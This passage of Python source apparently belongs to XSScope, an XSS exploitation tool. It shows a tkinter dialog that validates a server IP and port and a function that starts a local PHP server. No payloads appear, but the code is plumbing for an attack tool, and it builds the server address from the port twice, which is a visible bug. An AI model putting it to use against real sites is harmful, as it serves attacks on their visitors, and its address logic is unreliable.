            tcp_server = str(tcp_server[6:])

            # dividing IP and PORT in output displaying in each respective Entry
            tcp_server_ip = str(tcp_server[:-6])
            tcp_server_port = str(tcp_server[15:])
            root_main.destroy()
            main1()
        elif setup_var.get() == 2:
            tcp_server_ip = str(server_ip_entry.get())
            tcp_server_port = str(server_port_entry.get())
            if tcp_server_ip == "":
                tkinter.messagebox.showerror("Error","Please enter an URL/IP")
                return
            if " " in tcp_server_ip:
                tkinter.messagebox.showerror("Invalid URL Format", "Please enter a valid URL/IP format")
                return
            if tcp_server_port == "":
                tkinter.messagebox.showerror("Error","Please enter an PORT")
                return
            if " " in tcp_server_port:
                tkinter.messagebox.showerror("Invalid PORT Format", "Please enter a valid PORT format")
                return
            if int(tcp_server_port) > 65535:
                tkinter.messagebox.showerror("Invalid PORT number", "PORT must be a number between 0-65535")
                return
            tcp_server = tcp_server_port + ":" + tcp_server_port
            root_main.destroy()
            main1()

    def help_connect():
        webbrowser.open("https://github.com/kleiton0x00/XSScope/wiki/FAQ#what-is-beacon-interval", new=1)

    connect_button = tk.Button(button_frame, text="Connect", command=start_xsscope)
    connect_button.grid(row=0, column=0)

    help_button = tk.Button(button_frame, text="Help", command=help_connect)
    help_button.grid(row=0, column=1)

    # end of connect gui
    root_main.mainloop()

def php_server():
    os.system('php -S localhost:1337 >/dev/null')

# starting the threads
thread_2 = Process(target=php_server)
thread_2.start()

thread_1 = Process(target=main)
thread_1.start()

# closing threads
thread_2.join()
thread_1.join()
